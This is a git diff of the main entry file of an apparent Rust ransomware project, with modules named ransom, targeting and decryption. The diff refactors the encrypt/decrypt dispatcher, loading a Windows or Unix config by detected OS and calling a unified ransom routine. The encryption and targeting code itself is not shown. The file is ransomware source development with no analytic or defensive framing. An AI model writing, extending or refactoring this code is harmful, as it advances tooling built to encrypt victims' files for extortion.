@@ -6,14 +6,13 @@ mod core;
 
 use clap::Parser;
 use local_ip_address::local_ip;
-
+use std::sync::Arc;
 
 use crate::utils::{logger, config::AppConfig};
-use crate::core::{targeting, ransom_linux, ransom_windows};
+use crate::core::{targeting, ransom};
 use crate::crypto::decryption;
 
 
-/// Search for a pattern in a file and display the lines that contain it.
 #[derive(Parser)]
 struct Cli {
     /// Encrypt or decrypt option
@@ -26,46 +25,44 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Check the OS
     let family = std::env::consts::FAMILY;
-    let logger = logger::Logger::new();
+    
+    let logger = Arc::new(logger::Logger::new());
 
-    let config = match AppConfig::from_file("config_unix.toml") {
-        Ok(cfg) => cfg,
-        Err(e) => {
+    if args.mode == "encrypt" {
+        logger.log(match family {
+            "windows" => "Windows OS detected",
+            "unix" => "Unix/Linux OS detected",
+            _ => "No specific OS detected, defaulting to Linux",
+        });
+
+        let config_file = match family {
+            "windows" => "config_windows.toml",
+            "unix" => "config_unix.toml",
+            _ => "config_unix.toml",
+        };
+
+        let config = AppConfig::from_file(config_file)
+                                .unwrap_or_else(|e| {
             eprintln!("Failed to load config: {}", e);
             std::process::exit(1);
-        }
-    };
+        });
 
-
-    match args.mode.as_str() {
-        "encrypt" => {
-            if family == "windows" {
-                logger.log("Windows OS detected");
-                let _ = ransom_windows::ransom(&logger, &config);
-            } else if family == "unix" {
-                logger.log("Unix/Linux OS detected");
-                let _ = ransom_linux::ransom(&logger, &config).await;
-            } else {
-                logger.log("No specific OS detected, defaulting to Linux");
-                let _ = ransom_linux::ransom(&logger, &config).await;
-            }
+        let _ = ransom::ransom(logger.clone(), &config).await;
+    } else if args.mode == "decrypt" {
+        if family == "windows" {
+            logger.log("Windows OS detected");
+            let _ = decrypt_windows(&logger);
+        } else if family == "unix" {
+            logger.log("Linux OS detected");
+            let _ = decrypt_linux(&logger);
+        } else {
+            logger.log("No specific OS detected, defaulting to Linux");
+            let _ = decrypt_linux(&logger);
         }
-        "decrypt" => {
-            if family == "windows" {
-                logger.log("Windows OS detected");
-                let _ = decrypt_windows(&logger);
-            } else if family == "unix" {
-                logger.log("Linux OS detected");
-                let _ = decrypt_linux(&logger);
-            } else {
-                logger.log("No specific OS detected, defaulting to Linux");
-                let _ = decrypt_linux(&logger);
-            }
-        }
-        _ => {
-            eprintln!("Usage: <program> <encrypt|decrypt>");
-        }
+    } else {
+        eprintln!("Usage: <program> <encrypt|decrypt>");
     }
+
     
     Ok(())
 }
